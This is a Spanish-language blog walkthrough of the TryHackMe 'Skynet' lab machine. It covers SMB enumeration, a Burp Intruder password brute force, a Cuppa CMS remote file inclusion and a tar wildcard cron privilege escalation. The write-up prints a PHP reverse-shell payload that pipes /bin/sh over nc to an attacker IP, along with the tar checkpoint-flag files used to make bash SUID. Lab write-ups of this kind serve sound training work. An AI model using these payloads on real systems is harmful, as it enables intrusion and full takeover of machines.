---
layout: single
title: Máquina Skynet - TryHackMe (OSCP Style) (Offensive Pentesting Path)
excerpt: "La máquina Skynet es una máquina Linux que requerirá de una buena enumeración inicial y análisis de servicios en busca de una vía potencial de acceso y, posteriormente, una investigación sobre un nuevo método para escalar privilegios."
date: 2022-02-18
classes: wide
header:
  teaser: /assets/images/skynet/portada.jpg
  teaser_home_page: true
categories:
  - THM
  - Blog
  - Writeup
tags:
  - SMB
  - Fuzzing
  - BurpSuite
  - Intruder
  - Cuppa
  - RFI
  - tar wildcard
  - CVE-2017-7692
---

# Introducción
La máquina se encuentra en la plataforma [TryHackMe](https://tryhackme.com/room/skynet). Es la primera máquina de todo el path que no cuenta con instrucciones detalladas sobre su explotación, y deberemos de usar todo nuestro ingenio y conocimiento adquirido hasta ahora para poder realizar una buena enumeración que nos permita comprometer el sistema.

# Reconocimiento
La máquina tiene un sistema operativo Linux, lo cual podemos observar por medio de una traza ICMP.

![1]

Por medio de un escaneo de puertos con nmap, detectamos aquellos que se encuentren activos con un estatus **open** en la máquina víctima:

	nmap -sS --min-rate 5000 -p- --open -Pn -n 10.10.153.164 -oG allPorts

![2]

Vemos que se encuentran habilitados varios servicios, pero resaltan el SSH, HTTP, SMB y de E-Mail.

Si realizamos un escaneo más exhaustivo en busca de servicios y versiones específicas de dichos puertos, nos encontramos con la siguiente información:

	nmap -sC -sV -p22,80,110,139,143,445 10.10.153.164 -oN targeted

![3]

Nos devuelve un poco de información relevante, pero nada que nos ayude de momento, por lo que deberemos realizar una enumeración manual más exhaustiva de cada servicio en busca de información o vectores de ataque.

# Servicio SMB
Debo admitir que empecé por este servicio, cuando en una buena metodología deberíamos de haber empezado por el HTTP. Es recomendable seguir un órden de enumeración que siga los puertos habilitados en orden ascendente.

Si listamos los recursos compartidos por **SMB** veremos dos carpetas a las cuales podríamos acceder:

    smbclient -L 10.10.153.164 -N

    milesdyson
    anonymous

![4]

Accedemos primero al recurso **anonymous**. Como no contamos con credenciales, intentamos un logueo sin usuario ni contraseña; afortunadamente tenemos acceso y podemos listar su contenido.

![5]

Hay un archivo llamado **attention.txt** y una carpeta **logs**. Dentro de este último directorio hay tres archivos de texto, sin embargo, solo el llamado **log1.txt** tiene contenido; el resto están vacíos (su tamaño es cero).

![6]

Nos descargamos dichos ficheros a nuestra máquina con el comando **get**:

    get attention.txt

El primer archivo de texto (**attention.txt**) contiene un mensaje del usuario "Miles Dyson" indicándole a los empleados de Skynet que deben cambiar sus contraseñas. Esto nos da un indicio de que existe la posibilidad de que, de encontrar una contraseña, esta funcione. ¿Por qué? Porque los usuarios casi nunca cambian sus contraseñas.

![7]

No lo habíamos mencionado, pero la máquina se llama Skynet por la película Terminator. El personaje de Miles Dyson aparece en la segunda entrega como empleado y creador de la inteligencia artificial Skynet; tal vez esta información sea de relevancia después.

Por otro lado, el fichero **log1.txt** contiene un listado de contraseñas, por lo que suponemos que alguna de estas aún debe ser válida para algún usuario.

![8]

Por el momento no tenemos más que hacer aquí, así que intentemos acceder al segundo recurso compartido de SMB: la carpeta personal de Miles Dyson:

    smbclient //10.10.153.164/milesdyson

![9]

Como podemos observar, no contamos con acceso a esta carpeta ya que nos solicita una contraseña. Sigamos enumerando los demás servicios.

# Servicio HTTP
Si accedemos al servicio HTTP, veremos una especie de buscador con el logotipo de Skynet. Esta página no es funcional, por lo que se supone que el siguiente paso debe estar en algún subdirectorio.

![10]

Realizamos entonces un fuzzing en busca de directorios en el sitio web:

    wfuzz -c --hc=404 -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.153.164/FUZZ

![11]

Nos encontramos con varios directorios, entre ellos uno llamado admin. Intentemos acceder a este:

![12]

Este caso se repite para los demás directorios que entontramos, es decir, no tenemos permitido acceder a ellos; excepto el último. Si accedemos al directorio **squirrelmail** veremos lo siguiente:

![13]

Se trata de un panel de logueo para el servicio de correo electrónico SquirrelMail versión 1.4.23. Esta versión del software cuenta con una vulnerabilidad llamada CVE-2017-7692 que permite ejecución remota de comandos y existe un exploit que nos permite obtener directamente una reverse shell al sistema. Pero para ello, primero necesitamos de credenciales válidas para el servicio, por lo que teniendo un listado de posibles usuarios y uno de posibles contraseñas, no nos queda otra alternativa que intentar un ataque de fuerza bruta con lo que tenemos:

    Usuarios potenciales:
    miles
    milesdyson

# Ataque de fuerza bruta
Para ello vamos a emplear el Intruder de BurpSuite. Sabemos que en la versión Community es algo lento, pero al tener pocas contraseñas nos lo podemos permitir. Para ello, primero interceptamos una petición de logueo:

![14]

Con CTRL+I la enviamos al Intruder, limpiamos todos los payloads y seleccionamos únicamente la contraseña. En este caso, primero intentaremos con el usuario **miles**.

![15]

En la pestaña Payloads, seleccionamos un SimpleList y agregamos todo el archivo de contraseñas que encontramos en el SMB:

![16]

Para facilitar el encontrar la contraseña correcta, podemos agregar un Grep - Extract para que solo tome la leyenda indicativa de un logueo no exitoso en cada petición. De esta forma, si la leyenda no aparece, es porque nos topamos con una posible contraseña correcta.

![17]

Iniciamos el ataque y esperamos a que finalice. Por desgracia, esta primera corrida no encontró ninguna credencial válida.

![18]

Cambiamos ahora de usuario a **milesdyson** y realizamos nuevamente el ataque. Vemos que en este caso sí logra encontrar una credencial válida, las cuales son:

    milesdyson:cyborg007haloterminator

![19]

Si empleamos estas credenciales para loguearnos en el sitio web, veremos que son válidas y ahora podemos ver el correo entrante de este usuario:

![20]

# CVE-2017-7692 (fallido)
Con estas credenciales válidas, intentamos ejecutar el exploit para la vulnerabilidad CVE-2017-7692 proporcionado por el grupo **LegalHackers** en su [repositorio en GitHub](https://raw.githubusercontent.com/xl7dev/Exploit/master/SquirrelMail/SquirrelMail_RCE_exploit.sh).

Este se trata de un script en bash que requiere de la URL del servicio SquirrelMail y de las credenciales de usuario.

    ./SquirrelMail_RCE_exploit.sh http://10.10.67.32/squirrelmail/

![21]

Deberemos seleccionar el segundo payload, el cual subirá la reverse shell al sistema. Este a su vez nos pedirá la IP y puerto de escucha (es decir, los de nuestra máquina de atacante):

![22]

Este script lo que debería hacer es ponerse en escucha en el puerto indicado y devolver una shell del sistema remoto. Por desgracia, en nuestro caso, el script no funcionó y devolvió el código fuente de una página en la que indica que hubo un error al momento de enviar el correo (el exploit se basa en enviar un correo para obtener la reverse shell). Por lo que suponemos que el exploit no es válido en este caso.

![23]

# Enumerar nuevamente el SMB
Si accedemos a los correos de este usuario, veremos que en uno le han enviado sus nuevas credenciales para su carpeta personal de SMB; recordemos que había una a la que no podíamos acceder inicialmente:

![24]

Si intentamos acceder nuevamente con ayuda de **smbclient**, veremos que la credencial es válida y podemos ver nuevos archivos.

    smbclient //10.10.153.164/milesdyson -U milesdyson

Nota: Se debe añadir la bandera **-U** para incluir al usuario, el cual ya hemos visto, es **milesdyson**

![25]

Hay una variedad de artículos y lecturas en PDF, pero llama la atención una carpeta llamada **notes**, la abrimos y vemos el siguiente contenido:

![26]

Dentro hay varios archivos markdown que no son de relevancia, sin embargo, solo hay un archivo txt con el nombre de **important** (claro que debe contener algo importante). Lo descargamos y lo abrimos.

![27]

Las últimos dos líneas son referencias a la película de Terminator, sin embargo, la primera nos habla de un CMS que corre en un directorio personalizado del servicio HTTP.

# Buscando el CMS
Si accedemos a este por medio de un navegador nos encontraremos con la página personal de Miles y una pequeña semblanza que habla de su trabajo y participación en la creación de Skynet.

![28]

Intentamos analizar el sitio con Wappalizer, pero este no pudo detectar el CMS que supuestamente corre en este subdirectorio. El código fuente tampoco nos revela nada, así que lo mejor sería fuzzear este subdirectorio en busca de otro más que nos pueda revelar algo de información:

![29]

Obtenemos un directorio llamado **administrator**, así que accedemos encontrando lo siguiente:

![30]

Finalmente el nombre del CMS misterioso, el cual es un **Cuppa**. Lo buscamos en searchsploit para ver si cuenta con alguna vulnerabilidad, y al parecer así es:

![31]

# Remote File Inclusion
Esta es una vulnerabilidad tanto de Local File Inclusion como de Remote File Inclusion, la que vamos a usar es la última. En esta, la página vulnerable no tiene modo de sanitizar los parámetros de entrada y entonces somos capaces de anexar y visualizar en el navegador (y enviar peticiones al servidor) una página web que esté hosteada por un servidor bajo nuestro control. Es decir, lo que tenemos que hacer es crear un archivo php malicioso que nos permita obtener una reverse shell en el sistema, incluirla en el RFI y entonces el servidor remoto ejecutará las instrucciones regresándonos una consola.

Si abrimos el exploit, veremos las instrucciones y la URL que debemos ingresar para explotar la vulnerabilidad.

![32]

Primero lo probamos para ver si funciona con un archivo de prueba que solo contiene la cadena "**hola**", la hosteamos con un servidor HTTP con Python y lo agregamos a la URL para completar el RFI. Como podemos observar, este logra visualizar el archivo, por lo que es completamente vulnerable.

![33]

Para obtener una reverse shell, creamos un archivo php con el siguiente contenido. Recuerda modificar la IP y puerto de escucha locales:

    <?php echo "<pre>" . shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.14.131 443 >/tmp/f") . "</pre>"; ?>

Lo hosteamos con el servidor HTTP de Python, ponemos una consola en escucha con netcat y accedemos a la URL con el navegador:

![34]

Veremos cómo casi inmediatamente recibimos una conexión, habiendo ganado acceso al sistema:

![35]

Recordemos que cada que obtengamos una shell de Linux por medio de netcat, deberemos hacer un tratamiento de la TTY:

![36]

Ya con una consola estable, listamos la flag de usuario:

![37]

# Escalada de privilegios
Vemos que dentro de el directorio del usuario milesdyson hay una carpeta llamada **backup**, dentro de la cual hay un archivo .tar.gz y un script en bash. Este es un clásico y lo hemos visto en otra máquina de HackTheBox. Se trata de una escalada de privilegios por medio de las wildcards del binario **tar**. Esto lo podemos corroborar abriendo el script y observando que este crea un backup comprimido del directorio /var/www/html con ayuda de tar.

![38]

# Wildcards de tar
Para que este proceso sea exitoso, es necesario que este proceso de backup sea llevado a cabo por el usuario administrador por medio de una tarea cron. De esta forma, podemos ejecutar el comando que nosotros queramos como este usuario y entonces ganar acceso al sistema. Así que primero listamos las tareas cron del sistema:

![39]

Como podemos observar, está establecido que cada minuto se ejecuta dicho script para llevar a cabo el backup por medio del usuario root. Esto es perfecto, por lo que solo debemos llevar a cabo los pasos descritos en [este blog](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) para llevar a cabo la escalada de privilegios.

Básicamente, el problema de seguridad radica en el comando tar que se ejecuta dentro del script **backup.sh**:

    tar cf /home/milesdyson/backups/backup.tgz *

El asterisco del final es el problema. Es una wildcard (comodín) para decirle al comando tar que queremos comprimir todo el contenido del directorio actual (así no especificamos archivo por archivo) y lo guardemos en el archivo **backup.tgz**. Al no tener un control de los archivos que va a anexar, podemos incluir dos banderas al comando que nos permitan ejecutar un comando a la vez que se lleva a cabo el backup.

Estas banderas que necesitamos son:

    --checkpoint-action=exec=sh shell.sh
    --checkpoint=1

Para poder añadir estas banderas al comando tar (y como no podemos modificar el script original), simplemente las creamos como archivos dentro del directorio donde ejecute el backup:

    echo "" > "--checkpoint-action=exec=sh shell.sh"
    echo "" > --checkpoint=1

Esto a su vez requiere de un script llamado **shell.sh** que será el que contenga la instrucción que queremos ejecutar. Lo podemos crear de la siguiente manera:

    echo "chmod +s /bin/bash" > shell.sh

Puede ser el comando que quieras, y como de costumbre, vamos a convertir la bash a SUID. Recordemos que el backup se realiza en el directorio /var/www/html, por lo que estos archivos deberán de ser creados en dicha carpeta. Al final, deberemos tener lo siguiente:

![40]

De esta manera, cuando el comando tar sea ejecutado, anexará los archivos-banderas y el comando las considerará como esto último, como banderas. Es decir, el comando al final quedaría como lo siguiente:

    tar cf /home/milesdyson/backups/backup.tgz --checkpoint-action=exec=sh shell.sh --checkpoint=1 ARCHIVO1 ARCHIVO2...

De esta forma, cuando el script de backup sea ejecutado, ejecutará también la instrucción que hemos establecido. Para ello, solo debemos esperar a que la tarea cron se ejecute. Listamos los permisos de la /bin/bash para observar el cambio:

![41]

Primero, tiene sus permisos normales, pero pasados un par de segundos, veremos que cambia a SUID, por lo que el exploit se llevó a cabo de manera correcta:

![42]

Ya con la bash como root (bash -p), finalmente podemos mostrar la flag de root.

![43]

[1]:/assets/images/skynet/1.png
[2]:/assets/images/skynet/2.png
[3]:/assets/images/skynet/3.png
[4]:/assets/images/skynet/4.png
[5]:/assets/images/skynet/5.png
[6]:/assets/images/skynet/6.png
[7]:/assets/images/skynet/7.png
[8]:/assets/images/skynet/8.png
[9]:/assets/images/skynet/9.png
[10]:/assets/images/skynet/10.png
[11]:/assets/images/skynet/11.png
[12]:/assets/images/skynet/12.png
[13]:/assets/images/skynet/13.png
[14]:/assets/images/skynet/14.png
[15]:/assets/images/skynet/15.png
[16]:/assets/images/skynet/16.png
[17]:/assets/images/skynet/17.png
[18]:/assets/images/skynet/18.png
[19]:/assets/images/skynet/19.png
[20]:/assets/images/skynet/20.png
[21]:/assets/images/skynet/21.png
[22]:/assets/images/skynet/22.png
[23]:/assets/images/skynet/23.png
[24]:/assets/images/skynet/24.png
[25]:/assets/images/skynet/25.png
[26]:/assets/images/skynet/26.png
[27]:/assets/images/skynet/27.png
[28]:/assets/images/skynet/28.png
[29]:/assets/images/skynet/29.png
[30]:/assets/images/skynet/30.png
[31]:/assets/images/skynet/31.png
[32]:/assets/images/skynet/32.png
[33]:/assets/images/skynet/33.png
[34]:/assets/images/skynet/34.png
[35]:/assets/images/skynet/35.png
[36]:/assets/images/skynet/36.png
[37]:/assets/images/skynet/37.png
[38]:/assets/images/skynet/38.png
[39]:/assets/images/skynet/39.png
[40]:/assets/images/skynet/40.png
[41]:/assets/images/skynet/41.png
[42]:/assets/images/skynet/42.png
[43]:/assets/images/skynet/43.png